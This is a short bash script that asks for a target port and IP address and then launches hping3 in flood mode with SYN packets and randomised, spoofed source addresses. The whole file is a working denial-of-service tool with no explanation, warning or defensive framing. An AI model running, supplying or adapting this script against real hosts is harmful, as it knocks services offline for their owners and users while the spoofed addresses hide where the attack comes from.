#!/bin/bash
echo 'port:'
read port
echo 'ip:'
read ip
sudo hping3 --flood --rand-source -S -p $port $ip
